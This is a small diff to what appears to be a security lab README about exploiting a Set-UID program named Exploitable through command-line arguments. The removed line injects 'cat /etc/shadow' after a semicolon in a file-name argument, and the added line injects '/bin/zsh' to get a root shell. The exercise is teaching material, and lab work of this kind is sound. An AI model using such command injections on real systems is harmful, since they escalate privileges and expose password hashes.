@@ -47,7 +47,7 @@ Task 1: Compile Exploitable.c and make it a Set-UID program with compile-exploit
 Task 2: Make the Exploitable program execute arbitrary commands as root using only command line arguments.
 <br>
 `
-./Exploitable "./README.md;cat /etc/shadow"
+./Exploitable "./README.md;/bin/zsh"
 `
 <br>
 
